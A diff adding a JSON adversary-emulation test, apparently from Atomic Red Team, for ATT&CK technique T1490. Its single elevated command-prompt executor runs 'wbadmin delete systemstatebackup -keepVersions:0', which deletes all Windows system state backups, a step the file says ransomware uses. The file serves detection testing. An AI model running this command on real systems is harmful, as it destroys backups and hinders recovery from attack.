@@ -1,0 +1,24 @@
+{
+    "name": "Windows - wbadmin Delete systemstatebackup",
+    "description": "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "wbadmin delete systemstatebackup -keepVersions:0\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1490",
+    "tactics": [
+        "Impact"
+    ],
+    "technique": "Inhibit System Recovery",
+    "source": "ART",
+    "uuid": "584331dd-75bc-4c02-9e0b-17f5fd81c748",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
